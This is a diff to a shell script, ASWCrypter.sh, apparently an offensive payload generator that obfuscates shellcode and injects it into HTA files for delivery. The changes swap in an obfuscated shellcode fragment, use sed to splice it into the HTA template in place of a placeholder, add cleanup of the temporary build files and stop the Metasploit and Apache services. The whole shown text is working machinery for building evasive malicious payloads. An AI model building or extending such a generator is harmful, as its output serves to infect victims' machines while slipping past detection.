@@ -47,7 +47,12 @@ echo "[+] CTRL+C PRESSED !"
 sleep 1
 echo "[+] Cleanning generated files..."
 
-cd $getPATH && rm $getPATH/Base64 > /dev/null 2>&1 && rm $getPATH/shellWithNull > /dev/null 2>&1 && rm $getPATH/output/chars.raw > /dev/null 2>&1
+cd $getPATH && rm $getPATH/Base64 > /dev/null 2>&1 && rm $getPATH/shellWithNull > /dev/null 2>&1 && rm $getPATH/output/chars.raw > /dev/null 2>&1 && rm $getPATH/PayloadNametemp.hta > /dev/null 2>&1 && rm $getPATH/buildFrag > /dev/null 2>&1 && rm $getPATH/fragFile > /dev/null 2>&1 
+cd $getPATH && rm $getPATH/fragFile > /dev/null 2>&1
+cd $getPATH && rm $getPATH/buildFrag > /dev/null 2>&1
+
+#buildFrag
+
 # exit ASWCrypter.sh
 echo "[+] Exit Shellcode Generator..."
 sleep 1
@@ -173,12 +178,17 @@ sleep 2
 #Run Python Script
 python obfuscate.py
 
-getShell=`cat shellWithNull`
-echo "[$GREEN✔$RESTORE]$YELLOW Injecting shellcode  [$PayloadName.hta!] $RESTORE"
+getShell=`cat buildFrag`
+echo "[$GREEN✔$RESTORE]$YELLOW Injecting shellcode -> $PayloadName.hta! $RESTORE"
  
 sleep 3
 
+
+
 mv bk.hta $getPATH/output/$PayloadName.hta > /dev/null 2>&1
+sleep 1
+sed "s|Fa0CB0Ok|$getShell|g" $getPATH/output/$PayloadName.hta > PayloadNametemp.hta
+mv PayloadNametemp.hta $getPATH/output/$PayloadName.hta > /dev/null 2>&1
 chown $user $getPATH/output/$PayloadName.hta > /dev/null 2>&1
 
 
@@ -218,8 +228,9 @@ else
 /etc/init.d/metasploit stop > /dev/null 2>&1
 /etc/init.d/apache2 stop  > /dev/null 2>&1
 fi
-cd $getPATH && rm $getPATH/Base64 > /dev/null 2>&1 && rm $getPATH/shellWithNull > /dev/null 2>&1 && rm $getPATH/output/chars.raw > /dev/null 2>&1
-
+cd $getPATH && rm $getPATH/Base64 > /dev/null 2>&1 && rm $getPATH/shellWithNull > /dev/null 2>&1 && rm $getPATH/output/chars.raw > /dev/null 2>&1 && rm $getPATH/PayloadNametemp.hta > /dev/null 2>&1 && rm $getPATH/buildFrag > /dev/null 2>&1 && rm $getPATH/fragFile > /dev/null 2>&1 
+cd $getPATH && rm $getPATH/fragFile > /dev/null 2>&1
+cd $getPATH && rm $getPATH/buildFrag > /dev/null 2>&1
 cd ..
 ASWhelp
 exit
@@ -324,7 +335,6 @@ sleep 2
 	H) ASWhelp ;;
 	*) echo "\"$choice\": is not a valid Option"; sleep 2 ;;
 	esac
-
 
 
 
